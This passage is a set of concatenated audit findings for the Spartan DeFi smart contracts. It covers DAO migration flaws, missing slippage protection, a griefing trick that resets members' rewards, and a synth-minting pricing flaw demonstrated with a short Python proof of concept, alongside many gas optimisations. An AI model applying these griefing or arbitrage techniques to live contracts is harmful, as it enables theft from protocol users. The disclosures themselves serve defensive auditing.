https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L41-L43  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L20-L22  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L20-L22  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L29-L31  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L35-L37  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthFactory.sol#L27-L29  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L45-L47  Updated Getters: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L614-L684  Example uses of stale interface contract addresses _* instead of using Dao(DAO).* versions: _ROUTER: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L259  _BONDVAULT: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L281  _UTILS: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L205  _RESERVE: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L188  etc.  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  At a minimum, all DAO public/external functions should check and revert if daoHasMoved or the design can even consider a selfdestruct to destroy the DAO contract once it has successfully handed over to the new DAO contract and all pending actions have been cleared. In the unlikely requirement of older DAO contracts continuing to exist, they should at least use addresses of interfacing contracts as reported by the new DAO which could have updated them.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  Event log poisoning is possible by griefing attackers who have no DAO weight but vote and emit event that takes up event log space.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L382  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L393   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Emit event only if non-zero weight as relevant to proposal voting/cancelling.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO codebase not handle deflationary asset tokens. However, this is handled in similar _handleTransferIn functions of Router and poolFactory which indicates that protocol allows/anticipates listing of deflationary tokens which require a start balance check/subtraction before and after transfers to account for the actual amount transferred instead of taking the face-value amount from the parameter without considering any transfer fees imposed by the token contract.  Rationale for Medium severity: This is typically a low-severity finding in protocols that uniformly do not handle deflationary/inflationary/rebasing tokens because they either whitelist-away such tokens or do not anticipate handling them (by documenting and warning users) in their protocols. Spartan however has code indicative of expecting/handling deflationary tokens in Router and poolFactory but is missing similar special handling in DAO which is a case of missed handling and so is more serious because it leads to mis-accounting and potential fund loss in different parts of the protocol code.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L266  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L206-L208  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L111-L113  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add code similar to Router and poolFactory to handle deflationary tokens in DAO.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The state variables corresponding to setGenesisFactors() parameters _coolOff, _daysToEarn, _majorityFactor, _daoClaim and_daoFee are declared to be uint256 but are set using these parameters that are uint32. While it’s unlikely that these will need values > uint32, this leads to wastage of storage slots and gas.   ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L128  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L21-L24  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L19   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  The state variables can be declared uint32 to fit all five of them in a single slot and this will lead to efficient SSTOREs because they are set together. If values > uint32 are relevant, then the parameter types of setter setGenesisFactors() have to be changed.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO member withdrawal is missing an emit for MemberWithdraws event. This results in lack of transparency and off-chain monitoring capability.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L78  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L170-L174   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add an emit for the event or otherwise rationalize/document why it isn’t necessary and remove the event declaration.  
# Handle  natus   # Vulnerability details  ## Impact Here we return a value that isnt used anywhere which can safely be removed. This will save the return and also memory store gas costs  If the asset is not BNB/WBNB; we also get the startBal which is another memory store that isnt required, but more importantly we do a more expensive call to check the balance of the token in the pool contract which isnt required. This goes a step further at the 'actual' step at the end where we call the balance again and then do a MINUS math operation calling the memory value  Removing those lines will make all transactions cheaper that involve moving assets through the ROUTER, which appears to be quite a lot and sometimes even multiple times per function   ## Proof of Concept     ROUTER lines #197 to #211  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L197        ## Recommended Mitigation Steps     Remove these lines: #204 #206 #208  Also remove the return: returns(uint256 actual)  
# Handle  natus   # Vulnerability details  ## Impact     This is called with every dividend-generating txn (which is 100 or so txns per day/era by default and can be cranked up with an increase in txn volume, so higher importance than some of the other gas opts)       This is a little harder to optimize as it uses the changed state within the same function; however there is still room for optimization despite that; see below.   arrayFeeSize is called from storage twice every time; and if the array is fully built it's also called another 20 times (by default; can be increased by dao) per call to this function. As this variable doesn't change within this function; it can simply be called once at the started and stored in memory, should be a decent gas opt in a very commonly occuring txn  feeArray is also called from storage only once whilst the array is still building and not complete (this is okay) but once it's built it's called 20 times (again; by default; this might be raised) If we instead call this from storage once *just before* it's required in the loop (has to be after addFee() as this changes that feeArray's state) we can save even more gas  also; arrayFeeLength does not need to be stored in memory; just use feeArray.length from torage instead (only used once, so will only save the memory storage gas which is small)      ## Proof of Concept    ROUTER lines #285 to #297 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L285      ## Recommended Mitigation Steps    Step1: add at the start of the function: uint _arrayFeeSize = arrayFeeSize (Get storage arrayFeeSize & store in memory)  Step2: Replace all 3 instances of arrayFeeSize with _arrayFeeSize  Step3: add below addFee(_fee): uint [] memory _feeArray = feeArray (Get storage feeArray & store in memory)  Step4: replace feeArray[i] (inside the loop) to _feeArray[i]  Step5: remove line: uint arrayFeeLength = feeArray.length and replace arrayFeeLength with feeArray.length; no need to store in memory if its only used once  
# Handle  tensors   # Vulnerability details  ## Impact There are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated. This means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%.   ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L284  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L296  ## Recommended Mitigation Steps Add a minimum amount out parameter. The function reverts if the minimum amount isn't obtained.  
# Handle  natus   # Vulnerability details  ## Impact    This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.       If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas       ## Proof of Concept   SYNTHVAULT lines #249 to #255     https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L249       ## Recommended Mitigation Steps   Step1: Above line #249; add in:   uint [] memory _revArray = revenueArray  (Get the storage revenueArray and store it in memory)      Step2: change revenueArray.length to _revArray.length  (maybe even remove this memory variable and just call the length directly in the loop conditions in place of 'n'?)     Step3: change:   revenueArray[i] = revenueArray[i - 1]   to:   _revArray[i] = _revArray[i - 1]      Step4: change:   revenueArray[0] = _fee   To:   _revArray[0] = _fee      Step5: add:   revenueArray = _revArray  as the final line inside the function  
# Handle  natus   # Vulnerability details  ## Impact    Here we call the storage stakedSynthAssets 3 times in the loop or 4 times per loop if the reward is > 0.   It could instead be called once before the loop and stored in memory. Will save more gas as time goes on and the stakedSynthAssets array potentially gets larger as more assets get listed      ## Proof of Concept   SYNTHVAULT lines #121 to #132   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L121      ## Recommended Mitigation Steps   Step1: Above line #122; add in:   address [] memory _stakedSynthAssets = stakedSynthAssets  (Get the storage stakedSynthAssets and store it in memory)     Then: replace all 4 instances of:  stakedSynthAssets with _stakedSynthAssets  
# Handle  natus   # Vulnerability details  ## Impact   This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.     If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas     ## Proof of Concept  POOL lines #357 to #363   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L357     ## Recommended Mitigation Steps  Step1: Above line #358; add in:  uint [] memory _revArray = revenueArray (Get the storage revenueArray and store it in memory)    Step2: change revenueArray.length to _revArray.length    Step3: change:  revenueArray[i] = revenueArray[i - 1]  to:  _revArray[i] = _revArray[i - 1]    Step4: change:  revenueArray[0] = _fee  To:  _revArray[0] = _fee    Step5: add:  revenueArray = _revArray as the final line inside the function  
# Handle  natus   # Vulnerability details  ## Impact  This function calls feeArray from storage when setting 'n' and then twice every loop (feeArray[i] && feeArray[i - 1]) and then again after the loop once.   If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas   ## Proof of Concept UTILS lines #300 to #306  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L301    ## Recommended Mitigation Steps Step1: Above line #301; add in: uint [] memory _feeArray = feeArray (Get the storage feeArray and store it in memory)  Step2: change feeArray.length to _feeArray.length  Step3: change: feeArray[i] = feeArray[i - 1] to: _feeArray[i] = _feeArray[i - 1]  Step4: change: feeArray[0] = _fee To: _feeArray[0] = _fee  Step5: add: feeArray = _feeArray  as the final line inside the function  
# Handle  hrkrshnn   # Vulnerability details  ## Use unchecked blocks when safemath is not required  In some cases, it's unnecessary to use the default checked arithmetic. In such cases, wrapping the block in unchecked would save gas.  One example is:  ``` diff @@ -271,11 +272,13 @@ contract Pool is iBEP20 {       // Check the TOKEN amount received by this Pool      function _getAddedTokenAmount() internal view returns(uint256 _actual){ -        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); -        if(_tokenBalance > tokenAmount){ -            _actual = _tokenBalance-(tokenAmount); -        } else { -            _actual = 0; +        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); +       unchecked { +            if(_tokenBalance > tokenAmount){ +                _actual = _tokenBalance-(tokenAmount); +            } else { +                _actual = 0; +            }  ```  For loops, such optimizations would save a lot of gas.  ``` diff @@ -356,9 +359,11 @@ contract Pool is iBEP20 {       function addFee(uint _rev) internal {          uint _n = revenueArray.length; // 2 +       require(_n > 0); +       unchecked {          for (uint i = _n - 1; i > 0; i--) {              revenueArray[i] = revenueArray[i - 1];          } +       }          revenueArray[0] = _rev;      }  } ```   
# Handle  hrkrshnn   # Vulnerability details  ## Variables that can be converted into immutable  ``` txt Warning: Variable declaration can be converted into an immutable.   --> contracts/BondVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:16:5:    | 16 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:18:5:    | 18 |     uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:13:5:    | 13 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:15:5:    | 15 |     address public TOKEN;    |     ^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:16:5:    | 16 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:19:5:    | 19 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:27:5:    | 27 |     uint public genesis; // Timestamp from when the pool was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Router.sol:9:5:   | 9 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:10:5:    | 10 |     address public WBNB;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:8:5:   | 8 |     address public LayerONE; // Underlying relevant layer1 token   |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:9:5:   | 9 |     uint public genesis;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:10:5:    | 10 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:13:5:    | 13 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:10:5:    | 10 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:11:5:    | 11 |     uint public one = 10**18;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:10:5:    | 10 |     address public SPARTA;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:12:5:    | 12 |     uint256 public genesis;    |     ^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/outside-scope/Reserve.sol:8:5:   | 8 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:30:5:    | 30 |     uint256 private _100m;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:31:5:    | 31 |     uint256 public maxSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:38:5:    | 38 |     address public BASEv1;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:8:5:   | 8 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/poolFactory.sol:10:5:    | 10 |     uint public curatedPoolSize;    // Max amount of pools that can be curated status    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:6:5:   | 6 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:7:5:   | 7 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:15:5:    | 15 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:23:5:    | 23 |     uint public genesis;                // Timestamp from when the synth was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^  ```   Instead of using an expensive `sload` operation, converting to immutable would make reading to cost just 3 gas.   ## Tools Used  A custom compiler.  
# Handle  jonah1005   # Vulnerability details  ## Impact When users try to born synth, the fee and the value of Sparta is calculated at contract `Pool` while the logic of burning `Pool`s Lp and Synth is located at `Synth` contract.  Users can send synth to the `Synth` contract directly and trigger `burnSynth` at the `Pool` contract. The Pool would not send any token out while the `Synth` contract would burn the lp and Synth. While users can not drain the liquidity by doing this, breaking the AMM rate unexpectedly is may lead to troubles.  The calculation of debt and the fee would end up with a wrong answer.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L245  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L174  ## Tools Used None  ## Recommended Mitigation Steps  Pool's `burnSynth` and Synth's `burnSynth` are tightly coupled functions. In fact, according to the current logic, `Synth:burnSynth` should only be triggered from a valid `Pool` contract.  IMHO, applying the`Money in - Money Out` model in the `Synth` contract does more harm than good to the readability and security of the protocol. Consider to let `Pool` contract pass the parameters to the `Synth` contract and add a require check in the `Synth` contract.    
# Handle  hickuphh3   # Vulnerability details  ### Impact  `hasMinority()` is defined as a public function, but is unused in the contract. It can either be entirely removed or have its visibility changed to `external`.  
# Handle  GalloDaSballo   # Vulnerability details  ## Impact The function `_deposit` sets `mapMemberSynth_lastTime` to a date in the future https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107   `mapMemberSynth_lastTime` is also used to calculate rewards earned  `depositForMember` allows anyone, to "make a donation" for the member and cause that member to loose all their accrued rewards  This can't be used for personal gain, but can be used to bring misery to others.   ## Proof of Concept `depositForMember` https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L95 and can be called by anyone  This will set the member  ```  mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth) ```  this can be continuously exploited to make members never earn any reward   ## Recommended Mitigation Steps  This is the second submission under the same exploit This can be mitigated by harvesting for the user right before changing `mapMemberSynth_lastTime[_member][_synth]`  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107  
# Handle  natus   # Vulnerability details  ## Impact  Gas optimization / non-critical issue. Wasted lines of code creating and setting a local variable that does not appear to be required. I can't think of a reason to leave it in.    ## Proof of Concept _token local variable is not used anywhere in the codebase. Can be removed to save gas and compile size. Looks like it's to handle WBNB (if it was required) but forgot to check/remove after it was catered for elsewhere. - https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L83    ## Tools Used N/A    ## Recommended Mitigation Steps ROUTER.addLiquiditySingleForMember() - Remove line #82 - Remove line #83  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `calcLiquidityUnitsAsym()` function's last 2 lines are:  ```jsx uint two = 2; return (totalSupply * amount) / (two * (amount + baseAmount)); ```  The `two` assignment seems unnecessary.  ### Recommended Mitigation Steps  `return (totalSupply * amount) / (two * (amount + baseAmount));`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `newParamProposal()` takes in a `uint32 param` as an input argument. The valid scenarios for this proposal are for changing the cooloff period and erasToEarn via the `changeCooloff()` and `changeEras()`. These functions however cast the `param` to `uint256` before assigning it to the relevant variable.   We therefore have either of the following cases:  1.  `uint32 param` should be increased to `uint256 param` 2. `coolOffPeriod` and `erasToEarn` can be decreased in size to `uint32` instead of `uint256`. For further optimizations, these 2 variables should be grouped together so that they take up 1 storage slot instead of 2 separate ones.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `BASE` is defined as an `address` type, but is casted as `iBEP20` in almost every instance within the Dao contract, and in numerous instances in many other contracts as well. It would therefore be better to define it as `iBEP20` instead, to avoid casting.  ### Recommended Mitigation Steps  Change `address public BASE;` to `iBEP public BASE`. Castings of `BASE` to `iBEP20` can be removed subsequently.  
# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` calculates the amount to be minted based on `token_amount` and `sparta_amount` of the Pool. However, since `token_amount` in the pool would not decrease when users mint Synth, it's always cheaper to mint synth than swap the tokens.  The synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.  ## Proof of Concept Pool's mint synth https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242  The synth amount is calculated at L:232 ``` uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); ``` which is the same as swapping base to token at L:287 ``` uint256 _X = baseAmount; uint256 _Y = tokenAmount; _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output ```  However, while swapping tokens decrease pool's token, mint just mint it out of the air.  Here's a POC: Swap sparta to token for ten times ```python for i in range(10):     amount = 10 * 10**18     transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.swapTo(token.address, user).transact() ```  Mint Synth for ten times ```python for i in range(10):     amount = 10 * 10**18     transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.mintSynth(token_synth.address, user).transact() ``` The Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets `4744.4059` and the second case gets `6223.758`.  ## Tools Used None ## Recommended Mitigation Steps The debt should be considered in the AMM pool.  I recommend to maintain a debt variable in the Pool and use `tokenAmount - debt` when the Pool calculates the token price. Here's some idea of it. ```     uint256 public debt;     function _tokenAmount() returns (uint256) {         return tokenAmount - debt;     }      // Swap SPARTA for Synths     function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {         require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, "!synth"); // Must be a valid Synth         uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount          // Use tokenAmount - debt to calculate the value         uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN          // increment the debt         debt += output          uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted         _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount         uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN         fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA         _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold         iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user         _addPoolMetrics(fee); // Add slip fee to the revenue metrics         emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);       return (output, fee);     }  ```   
# Handle  hickuphh3   # Vulnerability details  ### Impact  The lines below of the `addLiquiditySingleForMember()` function  ```jsx address _token = token; if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB ```  are redundant since `_token` is not used subsequently. Note that `_handleTransferIn()` will perform the handling of native BNB transfers.  ### Recommended Mitigation Steps  The mentioned lines above can be removed.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  ```jsx // Pool.sol: L344-345 map30DPoolRevenue = 0; map30DPoolRevenue = map30DPoolRevenue+(_fee);  // Router.sol: L317-318 mapAddress_30DayDividends[_pool] = 0; mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees; ```  can simply be written as  ```jsx map30DPoolRevenue = _fee;  mapAddress_30DayDividends[_pool] = _fees; ```  respectively.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The contract performs allowance checks for transfers in 2 ways:  1. Check allowance is greater than requested amount, revert otherwise. Then do allowance decrement. (Eg. in `transferFrom`) 2. Directly do the allowance decrement, will revert for underflow since sol 0.8.3 is used. (Eg. in `burnFrom`  It is best to stick to 1 method for consistency. For gas optimizations, the 2nd method is better, but the first provides more meaningful revert messages to aid debugging.  ### Recommended Mitigation Steps  Commit to either method, not both.  
# Handle  hickuphh3   # Vulnerability details  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool equal){   if(sha256(part1) == sha256(part2)){       return true;   } } ```  Both implementations can be simplified and made consistent to be  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool){   return(sha256(part1) == sha256(part2)); } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In DaoVault and BondVault, the following mappings are declared private:  - `mapMember_weight` - `mapMemberPool_weight`  The DaoVault has an additional private mapping `mapMemberPool_balance`.  Despite this, the DaoVault has getter methods for all 3 mappings, whilst the BondVault only has a getter method for `mapMember_weight`.  The getter methods (which aren't included in the interface) would be unnecessary if the mappings are declared as public. Also, the BondVault might perhaps be lacking a view method for `mapMemberPool_weight`.   Should the separate getter methods remain unchanged, note that the getter method for `getMemberWeight()` has a convoluted implementation:  ```jsx function getMemberWeight(address member) external view returns (uint256) {  if (mapMember_weight[member] > 0) {   return mapMember_weight[member];   } else {     return 0;     } } ```  which can be simplified to simply returning the `mapMember_weight[member]`.  ### Recommended Mitigation Steps  - Declare the relevant private mappings as public. - Kindly check if `mapMemberPool_weight` should be public for the BondVault as well, since it is the case for the DaoVault.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `hasMajority()`, `hasQuorum()` and `hasMinority()` functions contains the following implementation:  ```jsx if(votes > consensus){  return true; } else {  return false; } ```  This can be reduced to `return (votes > consensus);`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  - `_pool` is fetched once in `claimForMember()`, but is fetched again in its sub function `decreaseWeight()`. Since `decreaseWeight()` is solely called by `claimForMember()`, the `_pool` variable can be passed as an input to `decreaseWeight()` to avoid having to retrieve its value again. - In `increaseWeight()` and `decreaseWeight()`, zeroing out `mapMemberPool_weight` is redundant as it is set to another value 2 lines later.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `uint private lastMonth; // Timestamp of the start of current metric period (For UI)`   There is no getter method for `lastMonth`, which makes the (For UI) comment is erroneous.  ### Recommended Mitigation Steps  Make it `public` or edit the comment  
# Handle  hickuphh3   # Vulnerability details  ### Impact  1. `DEPLOYER` is set in the constructor but is not used anywhere in the contract 2. Redundant initialization `lastMonth = 0;` 3. `genesis` and `decimals` can have the `immutable` keywords since they are only set in the constructor and can't be changed 4. `iUTILS(_DAO().UTILS())` is called many times in `mintSynth()`, `removeForMember()` and `_swap*()` functions. Recommend storing as a local variable in these functions. 5. Since `revenueArray` cannot exceed length 2, the `addFee` function can be directly incorporated into the `addRevenue` function. Its for loop can be replaced with direct replacement of values. Also, `revenueArray.length != 2` is cleaner and easier to read compared to `!(revenueArray.length == 2)`. Given its purpose and usage, `archiveRevenue` / `cachePastRevenue` seems to be a better function name. If it is clear that revenueArray will be kept constant at 2, an alternative is to simply store the values as 2 separate variables.  ### Recommended Mitigation Steps  1. Remove `DEPLOYER` 2. Remove the initialization `lastMonth = 0;` 3. `uint public immutable genesis;` and `uint8 public immutable override decimals;` 4. `iUTILS utils = _DAO().UTILS();` should utils be called more than once in a function 5. Possible implementation below  ```jsx function archiveRevenue(uint _totalRev) {  if (revenueArray.length == 2) {   // shift value to the right   revenueArray[1] = revenueArray[0];   revenueArray[0] = _totalRev;   } else {     // populate revenueArray to be of length 2     revenueArray.push(_totalRev);   } } ```  
